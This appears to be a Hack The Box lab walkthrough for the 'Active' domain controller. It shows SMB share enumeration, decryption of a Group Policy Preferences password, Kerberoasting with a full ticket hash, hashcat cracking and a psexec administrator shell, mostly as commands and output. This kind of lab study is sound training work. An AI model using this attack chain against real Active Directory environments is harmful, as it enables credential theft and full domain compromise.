# Recon
```
─$ nmap -sC -sV 10.10.10.100             
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-07 07:55 EEST
Stats: 0:00:15 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 37.52% done; ETC: 07:56 (0:00:25 remaining)
Stats: 0:01:48 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 66.67% done; ETC: 07:58 (0:00:30 remaining)
Stats: 0:02:02 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
NSE Timing: About 97.94% done; ETC: 07:57 (0:00:00 remaining)
Nmap scan report for 10.10.10.100
Host is up (0.33s latency).
Not shown: 982 closed tcp ports (conn-refused)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-08-07 03:56:46Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
49165/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2023-08-07T03:57:55
|_  start_date: 2023-08-07T02:28:51
| smb2-security-mode: 
|   210: 
|_    Message signing enabled and required
|_clock-skew: -59m53s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 139.01 seconds

```
- Port 445 is open and so it is worth running further nmap SMB scripts

```
─$ nmap --script safe -p445 10.10.10.100
Starting Nmap 7.93 ( https://nmap.org ) at 2023-08-07 07:59 EEST
Stats: 0:00:24 elapsed; 0 hosts completed (0 up), 0 undergoing Script Pre-Scan
NSE Timing: About 98.41% done; ETC: 07:59 (0:00:00 remaining)
Pre-scan script results:
|_hostmap-robtex: *TEMPORARILY DISABLED* due to changes in Robtex's API. See https://www.robtex.com/api/
| targets-asn: 
|_  targets-asn.asn is a mandatory parameter
|_http-robtex-shared-ns: *TEMPORARILY DISABLED* due to changes in Robtex's API. See https://www.robtex.com/api/
Nmap scan report for 10.10.10.100
Host is up (0.21s latency).

PORT    STATE SERVICE
445/tcp open  microsoft-ds
|_smb-enum-services: ERROR: Script execution failed (use -d to debug)

Host script results:
| unusual-port: 
|_  WARNING: this script depends on Nmap's service/version detection (-sV)
|_fcrdns: FAIL (No PTR record)
| smb2-security-mode: 
|   210: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-08-07T04:00:09
|_  start_date: 2023-08-07T02:28:51
| smb-mbenum: 
|_  ERROR: Failed to connect to browser service: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
| port-states: 
|   tcp: 
|_    open: 445
| smb2-capabilities: 
|   202: 
|     Distributed File System
|   210: 
|     Distributed File System
|     Leasing
|_    Multi-credit operations
| smb-protocols: 
|   dialects: 
|     202
|_    210
| dns-blacklist: 
|   SPAM
|     all.spamrats.com - FAIL
|     l2.apews.org - FAIL
|   ATTACK
|_    all.bl.blocklist.de - FAIL
|_clock-skew: -59m53s
|_msrpc-enum: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR

Post-scan script results:
| reverse-index: 
|_  445/tcp: 10.10.10.100
Nmap done: 1 IP address (1 host up) scanned in 68.99 seconds
```
- This reveals that SMB version 2 is running, and message signing is enabled and required for any clients connecting to it, which prevents SMB Relay attacks
- we use smbclient to list shares
```
└─$ smbclient -L 10.10.10.100
Password for [WORKGROUP\kali]:
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Replication     Disk      
        SYSVOL          Disk      Logon server share 
        Users           Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.100 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```
- we can use smbmap but not now
- possible to access with anonymous credentials is the “Replication” share, which seems to be a copy of SYSVOL
- interesting from a privilege escalation perspective as Group Policies (and Group Policy Preferences) are stored in the SYSVOL share, hich is world-readable to authenticated users
- to extract all the files
```
RECURSE ON
PROMPT OFF
mget *
```
- now we
```
sudo updatedb
locate Groups.xml
cat /home/kali/active.htb/Policies/{31B2F340-016D-11D2-945F-00C04FB984F9}/MACHINE/Preferences/Groups/Groups.xml
```
- we find username and  encrypted password
```
userName="active.htb\SVC_TGS"
cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
```
- we use gppdecrypyt
```
─$ gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
GPPstillStandingStrong2k18
```
- and we got a valid password
- With valid credentials for the active.htb domain, further enumeration can be undertaken. The SYSVOL and Users shares are now accessible and the user.txt flag can be retrieved
```
smbmap -H 10.10.10.100 -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18
smbclient //10.10.10.100/Users -U active.htb\\SVC_TGS%GPPstillStandingStrong2k18
```
# Kerberoasting
```
sudo ntpdate  10.10.10.100
─$ impacket-GetUserSPNs active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100 -request
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 21:06:40.351723  2023-08-07 05:29:56.301749             



[-] CCache file is not found. Skipping...
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$37c66c3120b358e00b92bb144538d7c6$d57c550b334e9b731fa92489c0cd6187757c8f59623dbe189e47dd47fdc599a1578e5cb7e19cdbc79314112837c0d8521cda683b57d85f2306ab5bc9489fdd5173bb0262ba02275a5920a7b23d56edf61c3ea846f60c9e801b1aac9ac8fb702ef0b6180b4332bcf0e33e5920837263c13be228cd5de7be23c4fe77be871f53f8cd84fe86f64541557fdc927ac7b4d23a7bfa49b5eec82540b028acd4d7d7afda72f6f00bbf72827004f81b86edb99904036593c681774e1f6ab496c42c0504058059e8bdfd07e8cb8fa95425ccaed869e3c85a26d9876eb4b7aafbb1ce3828d6439d0c6837610422f5592eeb79daa43248bee5ba7cff27a17bf729ecba6fb4f0c3c4d76559c55b397b5d6f0cac26ad3ae9644ebf2499f83c753a16f0747bfa16a4afadd27fa14a761428669c3ff7545616f2716810c64a4e87dda3426c2070b635dc75e4eb99b3130919be5b78748b244b2cd4f329ebea04696997fd27778e5a76b29c3903704693dd2f3e9dbaddcdb116e5b767b2cbbe07522ff7d02bd5fe8adf560e66492dace7be7a9afa0022db0a0290b8c853efe0bd48d0eb2f3d472104ea8ab7b4acc3fa0feb9ef22b09d270a6e32bab8e9189dee458bd5835656e67d22e62f432c99da18bebeb41909cf7db70297ff579abaa9e8ec9ba23616155fafb5f85de58aa45f9713db339e09f26464509ac3c251fd2f71b464a1e962b6586b692ec63ec9ed8d6f83988443edc85a2314402575f071ef6a0927bce582e471dfbb1c398da4481d26883d8d7013f652c030275a22fec86af0d1fcdc259b8d9f94fce2fb4061a31c8fa0bec44f573becb10d93da95ec9b41d165d8e609b780adea90158e664721f678f484cbc627c4cbd7bd61e9432cb58b573cbd572ee0212ccf050a53c619f65cba46ce97dcf47528a85229e0232c7c3b0108878713f59e0a86c2d58abfa2e4de49a1dbc68d621be43ea16442f0a2c8c9b67e37c58acd7bfa8db580f4fe7907c814f120371234e0ae5abe1370938693e62e32d12c8cfa6e4fbbc0b79b3d232e754126c910211718ce93b14f27d70f8ecfbf7628f0e7bce4c7a523538b9ad022401c8a8bf49104cfdf45b33945aad92812effb7c763c5692f07548e8d68f2d163d28bb1336622021a4355863b240bccc53c126c2c3e2f0fc7d8589767e323d3fcb43bc8db39ae683341e5c2a69cf570f7b57074767245bfbe2025c1d0b20347a1d69d4880f3ade2ddb72bbb7f70fefe9b17cab04b

```
- crack the hash with hashcat we identified and found the code which is 13100
```
$ hashcat -m 13100 -a 0 GetUserSPNs.out /usr/share/wordlists/rockyou.txt --force

```
- and we got a password
```
Ticketmaster1968
```
- we can login with smbclien and get root flag but i will use psexec
```
impacket-psexec active.htb/administrator@10.10.10.100 
```
- and we got a shell as nt authority

